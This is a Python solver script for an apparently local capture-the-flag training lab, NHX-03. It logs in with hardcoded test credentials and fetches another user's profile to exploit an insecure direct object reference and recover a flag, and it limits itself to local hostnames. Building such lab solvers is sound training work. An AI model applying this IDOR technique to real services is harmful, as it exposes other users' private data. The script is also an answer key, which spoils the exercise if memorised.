"""Solve the intentionally vulnerable local NHX-03 training service."""
import argparse
import re
from pathlib import Path
from urllib.parse import urlsplit
import requests

def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--base-url',default='https://noctihex.local/labs/nhx03')
    parser.add_argument('--ca',type=Path,default=Path(__file__).resolve().parents[3]/'platform/nginx/tls/noctihex.crt')
    args=parser.parse_args()
    if urlsplit(args.base_url).hostname not in ('noctihex.local','localhost','127.0.0.1'):
        parser.error('This solver is restricted to the local training lab')
    with requests.Session() as session:
        session.trust_env=False; session.verify=str(args.ca)
        try:
            page=session.post(args.base_url.rstrip('/')+'/login',data={'username':'tester','password':'noctihex123'},timeout=10)
            if page.status_code!=200 or urlsplit(page.url).path!='/labs/nhx03/profile/1':
                raise RuntimeError('Login did not reach the intended analyst profile')
            target=session.get(args.base_url.rstrip('/')+'/profile/2',timeout=10,allow_redirects=False)
            flag=re.search(r'NOCTIHEX\{[^}]+\}',target.text)
            if target.status_code!=200 or not flag:
                raise RuntimeError('Intended profile request did not recover a flag')
            print('Login and intended IDOR path succeeded.')
            print('Recovered flag:',flag.group())
            return 0
        except (requests.RequestException,RuntimeError) as error:
            print('Solver failed:',error); return 1

if __name__=='__main__':
    raise SystemExit(main())
